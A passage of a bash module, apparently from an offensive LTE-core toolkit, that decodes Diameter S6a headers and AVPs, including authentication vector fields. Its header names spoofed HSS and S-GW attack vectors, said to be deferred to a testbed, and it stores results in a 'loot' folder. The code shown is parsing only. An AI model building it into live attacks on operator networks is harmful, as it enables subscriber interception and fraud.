#!/usr/bin/env bash
# LTE Core (EPC) — Diameter S6a/S6d, GTP-C v2, GTP-U, S1-MME
#
# Split by capability, per MODULE_CONVENTIONS.md §9:
#
#   * Encoding and decoding is performed for real. Diameter messages, AVPs
#     (including grouped AVPs), GTP-C headers and IEs, GTP-U headers and the
#     extension-header chain are all built and parsed here from the octets.
#   * A *vector* that needs a live peer — sending a spoofed ULR at a real
#     HSS, injecting a Create Session Request at an S-GW/P-GW, probing an
#     MME over SCTP — cannot be performed without an EPC testbed. Those
#     verbs write a plan file carrying `status: handoff` and name exactly
#     what hardware and software is required. They do not pretend.
#
# Reference clause map:
#   RFC 6733 §3        Diameter message format (header, command flags)
#   RFC 6733 §4        AVP format and grouped AVPs
#   TS 29.272          S6a/S6d: AIR/AIA, ULR/ULA, CLR/CLA, IDR/IDA
#   TS 29.274 §5.1     GTP-C v2 header
#   TS 29.274 §8.1     GTP-C IE format (type, length, spare/instance, value)
#   TS 29.274 Table 8.1-1  GTP-C information element types
#   TS 29.281 §5.1     GTP-U header and the extension-header chain
#   TS 36.413          S1AP: SCTP association, initiating messages
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/lte_core"
LCORE_DIR="$LOOT_DIR/lte_core"
LCORE_PLANS="$LCORE_DIR/plans"
mkdir -p "$MOD_TMP" "$LCORE_DIR" "$LCORE_PLANS" 2>/dev/null

# ── sanitisation ────────────────────────────────────────────────────────
lcore_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

lcore_nfc() {
    local s="${1:-}"
    s="${s^^}"
    s="${s//[[:space:]]/}"
    s="${s//:/}"
    s="${s//-/}"
    printf '%s' "$s"
}

lcore_is_hex() {
    [[ "${1:-}" =~ ^[0-9A-Fa-f]+$ ]] && (( ${#1} % 2 == 0 ))
}

lcore_hex_to_ipv4() {
    # 8 hex chars, dotted quad. 0A 00 00 01 -> 10.0.0.1
    local h; h=$(lcore_nfc "${1:-}")
    [[ ${#h} -eq 8 ]] || return 1
    printf '%d.%d.%d.%d' $((16#${h:0:2})) $((16#${h:2:2})) $((16#${h:4:2})) $((16#${h:6:2}))
}

# ── Diameter base protocol — RFC 6733 §3 ────────────────────────────────
#
# Diameter header, 20 octets:
#   octet 0      : Version (1)
#   octets 1..3  : Message Length, 24-bit big-endian, includes the header
#   octet 4      : Command Flags
#                    bit 7 R  request
#                    bit 6 P  proxiable
#                    bit 5 E  error
#                    bit 4 T  retransmitted (potentially re-transmitted)
#                    bits 3..0 reserved (0)
#   octets 5..7  : Command Code, 24-bit big-endian
#   octets 8..11 : Application-Id, 32-bit big-endian
#   octets 12..15: Hop-by-Hop Identifier, 32-bit
#   octets 16..19: End-to-End Identifier, 32-bit
lcore_diameter_parse_header() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    (( ${#hex} >= 40 )) || { printf 'ERROR\tDiameter message shorter than the 20-octet header\n' >&2; return 1; }

    local ver="${hex:0:2}"
    local len=$(( 16#${hex:2:2} * 65536 + 16#${hex:4:2} * 256 + 16#${hex:6:2} ))
    local flags="${hex:8:2}"
    local fv=$(( 16#$flags ))
    local cmd=$(( 16#${hex:10:2} * 65536 + 16#${hex:12:2} * 256 + 16#${hex:14:2} ))
    local appid=$(( 16#${hex:16:2} * 16777216 + 16#${hex:18:2} * 65536 + 16#${hex:20:2} * 256 + 16#${hex:22:2} ))
    local hbh=$(( 16#${hex:24:2} * 16777216 + 16#${hex:26:2} * 65536 + 16#${hex:28:2} * 256 + 16#${hex:30:2} ))
    local e2e=$(( 16#${hex:32:2} * 16777216 + 16#${hex:34:2} * 65536 + 16#${hex:36:2} * 256 + 16#${hex:38:2} ))

    local v=$(( 16#$ver ))
    printf 'version\t%s\n' "$v"
    if (( v != 1 )); then
        printf 'ERROR\tversion %s is not the Diameter version 1 (RFC 6733 §3)\n' "$v" >&2
        return 1
    fi
    if (( fv & 0x0F )); then
        printf 'ERROR\treserved flag bits set (%s): RFC 6733 §3 reserves them\n' \
            "$(printf '%02X' "$(( fv & 0x0F ))")" >&2
        return 1
    fi
    printf 'length\t%s\n' "$len"
    printf 'flags\t%s\n' "$flags"
    printf 'flag_R\t%s\n' "$(( (fv >> 7) & 1 ))"
    printf 'flag_P\t%s\n' "$(( (fv >> 6) & 1 ))"
    printf 'flag_E\t%s\n' "$(( (fv >> 5) & 1 ))"
    printf 'flag_T\t%s\n' "$(( (fv >> 4) & 1 ))"
    printf 'command_code\t%s\n' "$cmd"
    printf 'command_name\t%s\n' "$(lcore_diameter_command_name "$cmd" "$appid")"
    printf 'application_id\t%s\n' "$appid"
    printf 'application_name\t%s\n' "$(lcore_diameter_app_name "$appid")"
    printf 'hop_by_hop_id\t%s\n' "$hbh"
    printf 'end_to_end_id\t%s\n' "$e2e"
    printf 'header_octets\t20\n'
    # The declared length must agree with the bytes actually present.
    local actual=$(( ${#hex} / 2 ))
    if (( len < 20 )); then
        printf 'ERROR\tdeclared length %s is shorter than the 20-octet header\n' "$len" >&2
        return 1
    fi
    printf 'actual_octets\t%s\n' "$actual"
    if (( len != actual )); then
        printf 'length_mismatch\tyes (declared %s, actual %s)\n' "$len" "$actual"
    else
        printf 'length_mismatch\tno\n'
    fi
    printf 'body\t%s\n' "${hex:40}"
    return 0
}

# Command Code classification — RFC 6733 §3.1 and TS 29.272 §7.
lcore_diameter_command_name() {
    # RFC 6733 §3.1 (base commands), RFC 4006 (CCR/CCA), RFC 4072 (DER/DEA),
    # and tables 5.1/1 to 5.1/4 of TS 29.230 for the 3GPP allocations.
    # A Request and its Answer share the code; direction is the R bit.
    case "${1:-}" in
        257)       echo "Capabilities-Exchange (CER/CEA)" ;;
        258)       echo "Re-Auth (RAR/RAA)" ;;
        268)       echo "Diameter-EAP (DER/DEA)" ;;
        271)       echo "Accounting (ACR/ACA)" ;;
        272)       echo "Credit-Control (CCR/CCA)" ;;
        274)       echo "Abort-Session (ASR/ASA)" ;;
        275)       echo "Session-Termination (STR/STA)" ;;
        280)       echo "Device-Watchdog (DWR/DWA)" ;;
        282)       echo "Disconnect-Peer (DPR/DPA)" ;;
        300)       echo "User-Authorization (UAR/UAA)  [Cx]" ;;
        301)       echo "Server-Assignment (SAR/SAA)  [Cx]" ;;
        302)       echo "Location-Info (LIR/LIA)  [Cx]" ;;
        303)       echo "Multimedia-Auth (MAR/MAA)  [Cx]" ;;
        304)       echo "Registration-Termination (RTR/RTA)  [Cx]" ;;
        305)       echo "Push-Profile (PPR/PPA)  [Cx]" ;;
        306)       echo "User-Data (UDR/UDA)  [Sh]" ;;
        307)       echo "Profile-Update (PUR/PUA)  [Sh]" ;;
        308)       echo "Subscribe-Notifications (SNR/SNA)  [Sh]" ;;
        309)       echo "Push-Notification (PNR/PNA)  [Sh]" ;;
        310)       echo "Bootstrapping-Info (BIR/BIA)  [Zn]" ;;
        311)       echo "Message-Process (MPR/MPA)  [MM10]" ;;
        312)       echo "GBAPush-Info (GPR/GPI)  [Zn]" ;;
        316)       echo "Update-Location (ULR/ULA)  [S6a/S6d]" ;;
        317)       echo "Cancel-Location (CLR/CLA)  [S6a/S6d]" ;;
        318)       echo "Authentication-Information (AIR/AIA)  [S6a/S6d]" ;;
        319)       echo "Insert-Subscriber-Data (IDR/IDA)  [S6a/S6d]" ;;
        320)       echo "Delete-Subscriber-Data (DSR/DSA)  [S6a/S6d]" ;;
        321)       echo "Purge-UE (PUR/PUA)  [S6a/S6d]" ;;
        322)       echo "Reset (RSR/RSA)  [S6a/S6d]" ;;
        323)       echo "Notify (NOR/NOA)  [S6a/S6d]" ;;
        324)       echo "ME-Identity-Check (ECR/ECA)  [S13/S13']" ;;
        8388620)   echo "Provide-Location (PLR/PLA)  [SLh]" ;;
        8388621)   echo "Location-Report (LRR/LRA)  [SLh]" ;;
        8388622)   echo "LCS-Routing-Info (RIR/RIA)  [SLg]" ;;
        8388635)   echo "Spending-Limit (SLR/SLA)  [Sy]" ;;
        8388636)   echo "Spending-Status-Notification (SNR/SNA)  [Sy]" ;;
        8388637)   echo "TDF-Session (TSR/TSA)  [Sd]" ;;
        8388638)   echo "Update-VCSG-Location (UVR/UVA)  [S7a/S7d]" ;;
        8388639)   echo "Device-Action (DAR/DAA)  [Tsp]" ;;
        8388640)   echo "Device-Notification (DNR/DNA)  [Tsp]" ;;
        8388642)   echo "Cancel-VCSG-Location (CVR/CVA)  [S7a/S7d]" ;;
        8388731)   echo "TSSF-Notification (TNR/TNA)  [T4]" ;;
        313)       echo "allocated to 3GPP, not used yet" ;;
        *)         echo "unassigned/unknown" ;;
    esac
}

# A Request and its Answer carry the SAME command code. Direction is the R
# bit (0x80) of the flags octet — RFC 6733 §3, "Command Flags". Classifying
# by command code cannot distinguish ULR from ULA; it only appeared to work
# because the two directions had been given separate numbers.
lcore_diameter_flags_is_request() {
    local f="${1:-}" v
    [[ -n "$f" ]] || return 1
    f="${f#0x}"; f="${f#0X}"
    [[ "$f" =~ ^[0-9A-Fa-f]{1,2}$ ]] || return 1
    v=$(( 16#$f )) || return 1
    (( v & 0x80 ))
}

lcore_diameter_app_name() {
    # Table 4.1 of TS 29.230 — the 3GPP application identifiers — plus the
    # base applications registered by IANA.
    case "${1:-}" in
        0)         echo "Diameter Common Messages" ;;
        1)         echo "NASREQ" ;;
        2)         echo "Mobile IPv4" ;;
        3)         echo "Diameter Base Accounting" ;;
        4)         echo "Credit-Control" ;;
        5)         echo "EAP" ;;
        16777216)  echo "3GPP Cx/Px" ;;
        16777217)  echo "3GPP Sh/Ph" ;;
        16777218)  echo "3GPP Re" ;;
        16777219)  echo "3GPP Wx" ;;
        16777220)  echo "3GPP Zn" ;;
        16777221)  echo "3GPP Zh" ;;
        16777222)  echo "3GPP Gq" ;;
        16777223)  echo "3GPP Gmb" ;;
        16777224)  echo "3GPP Gx" ;;
        16777225)  echo "3GPP Gx over Gy" ;;
        16777226)  echo "3GPP MM10" ;;
        16777229)  echo "3GPP Rx" ;;
        16777230)  echo "3GPP Pr" ;;
        16777236)  echo "3GPP Rx (29.214)" ;;
        16777238)  echo "3GPP Gx (29.212)" ;;
        16777250)  echo "3GPP STa" ;;
        16777251)  echo "3GPP S6a/S6d" ;;
        16777252)  echo "3GPP S13/S13'" ;;
        16777255)  echo "3GPP SLg" ;;
        16777264)  echo "3GPP SWm" ;;
        16777265)  echo "3GPP SWx" ;;
        16777266)  echo "3GPP Gxx" ;;
        16777267)  echo "3GPP S9" ;;
        16777268)  echo "3GPP Zpn" ;;
        16777272)  echo "3GPP S6b" ;;
        16777291)  echo "3GPP SLh" ;;
        16777292)  echo "3GPP SGmb" ;;
        16777302)  echo "3GPP Sy" ;;
        16777303)  echo "3GPP Sd" ;;
        16777308)  echo "3GPP S7a" ;;
        16777309)  echo "3GPP Tsp" ;;
        16777310)  echo "3GPP S6m" ;;
        16777311)  echo "3GPP T4" ;;
        16777312)  echo "3GPP S6c" ;;
        16777313)  echo "3GPP SGd" ;;
        16777318)  echo "3GPP S15" ;;
        16777319)  echo "3GPP S9a" ;;
        16777320)  echo "3GPP S9a*" ;;
        16777335)  echo "3GPP MB2-C" ;;
        16777336)  echo "3GPP PC4a" ;;
        16777337)  echo "3GPP PC2" ;;
        16777340)  echo "3GPP PC6/PC7" ;;
        16777342)  echo "3GPP Np" ;;
        16777345)  echo "3GPP S6t" ;;
        16777346)  echo "3GPP T6a/T6b" ;;
        16777347)  echo "3GPP Ns" ;;
        16777348)  echo "3GPP Nt" ;;
        16777349)  echo "3GPP St" ;;
        16777350)  echo "3GPP PC2" ;;
        16777351)  echo "3GPP Diameter Data" ;;
        *)          echo "unknown" ;;
    esac
}

# ── Diameter AVP — RFC 6733 §4 ──────────────────────────────────────────
#
#   octets 0..3 : AVP Code, 32-bit
#   octets 4..7 : AVP Flags (8 bits) | AVP Length (24 bits)
#                   bit 7 V  Vendor-Specific
#                   bit 6 M  Mandatory
#                   bit 5 P  Protected
#                   bit 4..0 reserved
#   octets 8..11: Vendor-Id, present ONLY when V is set
#   remainder   : Data, padded to a 4-octet boundary (padding not counted
#                 in the AVP Length)
lcore_diameter_parse_avps() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || return 1
    local off=0 total=$(( ${#hex} / 2 ))
    local n=0
    while (( off + 8 <= total )); do
        local base=$(( off * 2 ))
        local code=$(( 16#${hex:$base:2} * 16777216 + 16#${hex:$((base+2)):2} * 65536 \
                    + 16#${hex:$((base+4)):2} * 256 + 16#${hex:$((base+6)):2} ))
        local flags="${hex:$((base+8)):2}"
        local fv=$(( 16#$flags ))
        local alen=$(( 16#${hex:$((base+10)):2} * 65536 + 16#${hex:$((base+12)):2} * 256 \
                    + 16#${hex:$((base+14)):2} ))
        (( alen >= 8 )) || { printf 'ERROR\tAVP %s has length %s (< 8)\n' "$code" "$alen" >&2; return 1; }
        # A declared length past the end of the buffer is a truncated or
        # hostile message. Reading it anyway would emit a short value while
        # claiming the declared size, so it is rejected outright.
        (( off + alen <= total )) || {
            printf 'ERROR\tAVP %s declares %s octets but only %s remain\n' \
                "$code" "$alen" "$(( total - off ))" >&2
            return 1
        }
        local vbit=$(( (fv >> 7) & 1 ))
        local mbit=$(( (fv >> 6) & 1 ))
        local pbit=$(( (fv >> 5) & 1 ))
        local hdrlen=8
        local vid=""
        if (( vbit == 1 )); then
            hdrlen=12
            vid=$(( 16#${hex:$((base+16)):2} * 16777216 + 16#${hex:$((base+18)):2} * 65536 \
                  + 16#${hex:$((base+20)):2} * 256 + 16#${hex:$((base+22)):2} ))
        fi
        (( alen >= hdrlen )) || { printf 'ERROR\tAVP %s length %s shorter than its vendor header\n' "$code" "$alen" >&2; return 1; }
        local dlen=$(( alen - hdrlen ))
        local data="${hex:$(((off + hdrlen) * 2)):$((dlen * 2))}"

        printf 'avp.%d.code\t%s\n' "$n" "$code"
        printf 'avp.%d.name\t%s\n' "$n" "$(lcore_diameter_avp_name "$code")"
        printf 'avp.%d.flags\t%s\n' "$n" "$flags"
        printf 'avp.%d.V\t%s\n' "$n" "$vbit"
        printf 'avp.%d.M\t%s\n' "$n" "$mbit"
        printf 'avp.%d.P\t%s\n' "$n" "$pbit"
        printf 'avp.%d.length\t%s\n' "$n" "$alen"
        [[ -n "$vid" ]] && printf 'avp.%d.vendor_id\t%s\n' "$n" "$vid"
        printf 'avp.%d.data_octets\t%s\n' "$n" "$dlen"
        printf 'avp.%d.data\t%s\n' "$n" "$data"

                # Typed rendering for the AVPs whose wire type is fixed in
        # Table 7.3.1/1 of TS 29.272 or §4.1 of RFC 6733. The numbers are
        # the table's: an AVP whose code is one off is a different AVP, and
        # decoding it under the wrong name is how the old table read an
        # Authentication-Info as a Re-Synchronization-Info.
        case "$code" in
            263) printf 'avp.%d.decoded\tSession-Id=%s\n' "$n" \
                     "$(lcore_diameter_utf8 "$data")" ;;
            264|296|293|283|1) printf 'avp.%d.decoded\t%s=%s\n' "$n" \
                     "$(lcore_diameter_avp_name "$code")" "$(lcore_diameter_utf8 "$data")" ;;
            277) printf 'avp.%d.decoded\tAuth-Session-State=%s\n' "$n" \
                     "$([[ "$data" == "00000000" ]] && echo 'NO_STATE_MAINTAINED (0)' || echo "value $data")" ;;
            268) printf 'avp.%d.decoded\tResult-Code=%s\n' "$n" \
                     "$(lcore_diameter_result_code "$(( 16#${data:0:8} ))")" ;;
            298) printf 'avp.%d.decoded\tExperimental-Result-Code=%s\n' "$n" \
                     "$(lcore_diameter_exp_result_code "$(( 16#${data:0:8} ))")" ;;
            297) printf 'avp.%d.decoded\tExperimental-Result (grouped)\n' "$n" ;;
            291) printf 'avp.%d.decoded\tAuthorization-Lifetime=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1405|1406) printf 'avp.%d.decoded\t%s=%s\n' "$n" \
                     "$(lcore_diameter_avp_name "$code")" "$(( 16#${data:0:8} ))" ;;
            1407) printf 'avp.%d.decoded\tVisited-PLMN-Id=%s\n' "$n" \
                     "$(lcore_plmn_from_octets "$data")" ;;
            1410) printf 'avp.%d.decoded\tNumber-Of-Requested-Vectors=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1032) printf 'avp.%d.decoded\tRAT-Type=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1412) printf 'avp.%d.decoded\tImmediate-Response-Preferred=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1417) printf 'avp.%d.decoded\tNetwork-Access-Mode=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1420) printf 'avp.%d.decoded\tCancellation-Type=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1424) printf 'avp.%d.decoded\tSubscriber-Status=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1425) printf 'avp.%d.decoded\tOperator-Determined-Barring=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1426) printf 'avp.%d.decoded\tAccess-Restriction-Data=%s\n' "$n" \
                     "$(( 16#${data:0:8} ))" ;;
            1427) printf 'avp.%d.decoded\tAPN-OI-Replacement=%s\n' "$n" \
                     "$(lcore_diameter_utf8 "$data")" ;;
            1411) printf 'avp.%d.decoded\tRe-Synchronization-Info=%s\n' "$n" "$data" ;;
            1400) printf 'avp.%d.decoded\tSubscription-Data (grouped)\n' "$n" ;;
            1401) printf 'avp.%d.decoded\tTerminal-Information (grouped)\n' "$n" ;;
            1408) printf 'avp.%d.decoded\tRequested-EUTRAN-Authentication-Info (grouped)\n' "$n" ;;
            1409) printf 'avp.%d.decoded\tRequested-UTRAN-GERAN-Authentication-Info (grouped)\n' "$n" ;;
            1413) printf 'avp.%d.decoded\tAuthentication-Info (grouped)\n' "$n" ;;
            1414) printf 'avp.%d.decoded\tE-UTRAN-Vector (grouped)\n' "$n" ;;
            1415) printf 'avp.%d.decoded\tUTRAN-Vector (grouped)\n' "$n" ;;
            1416) printf 'avp.%d.decoded\tGERAN-Vector (grouped)\n' "$n" ;;
            1429) printf 'avp.%d.decoded\tAPN-Configuration-Profile (grouped)\n' "$n" ;;
            1430) printf 'avp.%d.decoded\tAPN-Configuration (grouped)\n' "$n" ;;
            1431) printf 'avp.%d.decoded\tEPS-Subscribed-QoS-Profile (grouped)\n' "$n" ;;
            1435) printf 'avp.%d.decoded\tAMBR (grouped)\n' "$n" ;;
            1436) printf 'avp.%d.decoded\tCSG-Subscription-Data (grouped)\n' "$n" ;;
            1458) printf 'avp.%d.decoded\tTrace-Data (grouped)\n' "$n" ;;
            1467) printf 'avp.%d.decoded\tGPRS-Subscription-Data (grouped)\n' "$n" ;;
            1469) printf 'avp.%d.decoded\tPDP-Context (grouped)\n' "$n" ;;
            1472) printf 'avp.%d.decoded\tSpecific-APN-Info (grouped)\n' "$n" ;;
            1473) printf 'avp.%d.decoded\tLCS-Info (grouped)\n' "$n" ;;
            1475) printf 'avp.%d.decoded\tLCS-PrivacyException (grouped)\n' "$n" ;;
            1479) printf 'avp.%d.decoded\tExternal-Client (grouped)\n' "$n" ;;
            1483) printf 'avp.%d.decoded\tService-Type (grouped)\n' "$n" ;;
            1485) printf 'avp.%d.decoded\tMO-LR (grouped)\n' "$n" ;;
            1486) printf 'avp.%d.decoded\tTeleservice-List (grouped)\n' "$n" ;;
            1488) printf 'avp.%d.decoded\tCall-Barring-Info (grouped)\n' "$n" ;;
            1495) printf 'avp.%d.decoded\tEPS-User-State (grouped)\n' "$n" ;;
            1496) printf 'avp.%d.decoded\tEPS-Location-Information (grouped)\n' "$n" ;;
            1497) printf 'avp.%d.decoded\tMME-User-State (grouped)\n' "$n" ;;
            1498) printf 'avp.%d.decoded\tSGSN-User-State (grouped)\n' "$n" ;;
            1600) printf 'avp.%d.decoded\tMME-LocationInformation (grouped)\n' "$n" ;;
            1601) printf 'avp.%d.decoded\tSGSN-Location-Information (grouped)\n' "$n" ;;
            1612) printf 'avp.%d.decoded\tActive-APN (grouped)\n' "$n" ;;
            1622) printf 'avp.%d.decoded\tMDT-Configuration (grouped)\n' "$n" ;;
            1624) printf 'avp.%d.decoded\tArea-Scope (grouped)\n' "$n" ;;
            1637) printf 'avp.%d.decoded\tEquivalent-PLMN-List (grouped)\n' "$n" ;;
            1641) printf 'avp.%d.decoded\tVPLMN-CSG-Subscription-Data (grouped)\n' "$n" ;;
            1649) printf 'avp.%d.decoded\tLocal-Time-Zone (grouped)\n' "$n" ;;
            1667) printf 'avp.%d.decoded\tWLAN-offloadability (grouped)\n' "$n" ;;
            1672) printf 'avp.%d.decoded\tAdjacent-PLMNs (grouped)\n' "$n" ;;
            1673) printf 'avp.%d.decoded\tAdjacent-Access-Restriction-Data (grouped)\n' "$n" ;;
            1675) printf 'avp.%d.decoded\tIMSI-Group-Id (grouped)\n' "$n" ;;
            1685) printf 'avp.%d.decoded\tSubscription-Data-Deletion (grouped)\n' "$n" ;;
            1686) printf 'avp.%d.decoded\tPreferred-Data-Mode (grouped)\n' "$n" ;;
            1687) printf 'avp.%d.decoded\tEmergency-Info (grouped)\n' "$n" ;;
            1688) printf 'avp.%d.decoded\tV2X-Subscription-Data (grouped)\n' "$n" ;;
            1691) printf 'avp.%d.decoded\teDRX-Cycle-Length (grouped)\n' "$n" ;;
            1694) printf 'avp.%d.decoded\tMBSFN-Area (grouped)\n' "$n" ;;
            1701) printf 'avp.%d.decoded\tPaging-Time-Window (grouped)\n' "$n" ;;
            1705) printf 'avp.%d.decoded\teDRX-Related-RAT (grouped)\n' "$n" ;;
            # The authentication vector fields, §7.3.53-§7.3.56.
            1447) printf 'avp.%d.decoded\tRAND=%s\n' "$n" "$data" ;;
            1448) printf 'avp.%d.decoded\tXRES=%s\n' "$n" "$data" ;;
            1449) printf 'avp.%d.decoded\tAUTN=%s\n' "$n" "$data" ;;
            1450) printf 'avp.%d.decoded\tKASME=%s\n' "$n" "$data" ;;
        esac

        off=$(( off + alen ))
        # Advance past the 4-octet padding, which is not part of AVP Length.
        while (( off % 4 != 0 )); do off=$(( off + 1 )); done
        n=$(( n + 1 ))
    done
    # Anything left is shorter than an AVP header and cannot be padding: the
    # loop above already stepped over the 4-octet alignment after each AVP.
    if (( off < total )); then
        printf 'ERROR\t%s octet(s) left over after the last AVP, too few for a header\n' \
            "$(( total - off ))" >&2
        return 1
    fi
    printf 'avp_count\t%s\n' "$n"
    return 0
}

# AVP Code registry — TS 29.272 §7.3 plus the Diameter base codes.
lcore_diameter_avp_name() {
    # RFC 6733 §4.1 base AVPs and Table 7.3.1/1 of TS 29.272
    # (S6a/S6d, S7a/S7d, S13/S13'), generated from the clause tables.
    case "${1:-}" in
        1)       echo "User-Name" ;;
        25)      echo "Class" ;;
        27)      echo "Session-Timeout" ;;
        33)      echo "Proxy-State" ;;
        44)      echo "Acct-Session-Id" ;;
        50)      echo "Acct-Multi-Session-Id" ;;
        55)      echo "Event-Timestamp" ;;
        85)      echo "Acct-Interim-Interval" ;;
        257)     echo "Host-IP-Address" ;;
        258)     echo "Auth-Application-Id" ;;
        259)     echo "Acct-Application-Id" ;;
        260)     echo "Vendor-Specific-Application-Id" ;;
        261)     echo "Redirect-Host-Usage" ;;
        262)     echo "Redirect-Max-Cache-Time" ;;
        263)     echo "Session-Id" ;;
        264)     echo "Origin-Host" ;;
        265)     echo "Supported-Vendor-Id" ;;
        266)     echo "Vendor-Id" ;;
        267)     echo "Firmware-Revision" ;;
        268)     echo "Result-Code" ;;
        269)     echo "Product-Name" ;;
        270)     echo "Session-Binding" ;;
        271)     echo "Session-Server-Failover" ;;
        272)     echo "Multi-Round-Time-Out" ;;
        273)     echo "Disconnect-Cause" ;;
        274)     echo "Auth-Request-Type" ;;
        276)     echo "Auth-Grace-Period" ;;
        277)     echo "Auth-Session-State" ;;
        278)     echo "Origin-State-Id" ;;
        279)     echo "Failed-AVP" ;;
        280)     echo "Proxy-Host" ;;
        281)     echo "Error-Message" ;;
        282)     echo "Route-Record" ;;
        283)     echo "Destination-Realm" ;;
        284)     echo "Proxy-Info" ;;
        285)     echo "Re-Auth-Request-Type" ;;
        287)     echo "Accounting-Sub-Session-Id" ;;
        291)     echo "Authorization-Lifetime" ;;
        292)     echo "Redirect-Host" ;;
        293)     echo "Destination-Host" ;;
        294)     echo "Error-Reporting-Host" ;;
        295)     echo "Termination-Cause" ;;
        296)     echo "Origin-Realm" ;;
        297)     echo "Experimental-Result" ;;
        298)     echo "Experimental-Result-Code" ;;
        299)     echo "Inband-Security-Id" ;;
        480)     echo "Accounting-Record-Type" ;;
        483)     echo "Accounting-Realtime-Required" ;;
        485)     echo "Accounting-Record-Number" ;;
        1400)    echo "Subscription-Data" ;;
        1401)    echo "Terminal-Information" ;;
        1402)    echo "IMEI" ;;
        1403)    echo "Software-Version" ;;
        1404)    echo "QoS-Subscribed" ;;
        1405)    echo "ULR-Flags" ;;
        1406)    echo "ULA-Flags" ;;
        1407)    echo "Visited-PLMN-Id" ;;
        1408)    echo "Requested-EUTRAN-Authentication-Info" ;;
        1409)    echo "Requested-UTRAN-GERAN-Authentication-Info" ;;
        1410)    echo "Number-Of-Requested-Vectors" ;;
        1411)    echo "Re-Synchronization-Info" ;;
        1412)    echo "Immediate-Response-Preferred" ;;
        1413)    echo "Authentication-Info" ;;
        1414)    echo "E-UTRAN-Vector" ;;
        1415)    echo "UTRAN-Vector" ;;
        1416)    echo "GERAN-Vector" ;;
        1417)    echo "Network-Access-Mode" ;;
        1418)    echo "HPLMN-ODB" ;;
        1419)    echo "Item-Number" ;;
        1420)    echo "Cancellation-Type" ;;
        1421)    echo "DSR-Flags" ;;
        1422)    echo "DSA-Flags" ;;
        1423)    echo "Context-Identifier" ;;
        1424)    echo "Subscriber-Status" ;;
        1425)    echo "Operator-Determined-Barring" ;;
        1426)    echo "Access-Restriction-Data" ;;
        1427)    echo "APN-OI-Replacement" ;;
        1428)    echo "All-APN-Configurations-Included-Indicator" ;;
        1429)    echo "APN-Configuration-Profile" ;;
        1430)    echo "APN-Configuration" ;;
        1431)    echo "EPS-Subscribed-QoS-Profile" ;;
        1432)    echo "VPLMN-Dynamic-Address-Allowed" ;;
        1433)    echo "STN-SR" ;;
        1434)    echo "Alert-Reason" ;;
        1435)    echo "AMBR" ;;
        1436)    echo "CSG-Subscription-Data" ;;
        1437)    echo "CSG-Id" ;;
        1438)    echo "PDN-GW-Allocation-Type" ;;
        1439)    echo "Expiration-Date" ;;
        1440)    echo "RAT-Frequency-Selection-Priority-ID" ;;
        1441)    echo "IDA-Flags" ;;
        1442)    echo "PUA-Flags" ;;
        1443)    echo "NOR-Flags" ;;
        1444)    echo "User-Id" ;;
        1445)    echo "Equipment-Status" ;;
        1446)    echo "Regional-Subscription-Zone-Code" ;;
        1447)    echo "RAND" ;;
        1448)    echo "XRES" ;;
        1449)    echo "AUTN" ;;
        1450)    echo "KASME" ;;
        1452)    echo "Trace-Collection-Entity" ;;
        1453)    echo "Kc" ;;
        1454)    echo "SRES" ;;
        1456)    echo "PDN-Type" ;;
        1457)    echo "Roaming-Restricted-Due-To-Unsupported-Feature" ;;
        1458)    echo "Trace-Data" ;;
        1459)    echo "Trace-Reference" ;;
        1462)    echo "Trace-Depth" ;;
        1463)    echo "Trace-NE-Type-List" ;;
        1464)    echo "Trace-Interface-List" ;;
        1465)    echo "Trace-Event-List" ;;
        1466)    echo "OMC-Id" ;;
        1467)    echo "GPRS-Subscription-Data" ;;
        1468)    echo "Complete-Data-List-Included-Indicator" ;;
        1469)    echo "PDP-Context" ;;
        1470)    echo "PDP-Type" ;;
        1471)    echo "3GPP2-MEID" ;;
        1472)    echo "Specific-APN-Info" ;;
        1473)    echo "LCS-Info" ;;
        1474)    echo "GMLC-Number" ;;
        1475)    echo "LCS-PrivacyException" ;;
        1476)    echo "SS-Code" ;;
        1477)    echo "SS-Status" ;;
        1478)    echo "Notification-To-UE-User" ;;
        1479)    echo "External-Client" ;;
        1480)    echo "Client-Identity" ;;
        1481)    echo "GMLC-Restriction" ;;
        1482)    echo "PLMN-Client" ;;
        1483)    echo "Service-Type" ;;
        1484)    echo "ServiceTypeIdentity" ;;
        1485)    echo "MO-LR" ;;
        1486)    echo "Teleservice-List" ;;
        1487)    echo "TS-Code" ;;
        1488)    echo "Call-Barring-Info" ;;
        1489)    echo "SGSN-Number" ;;
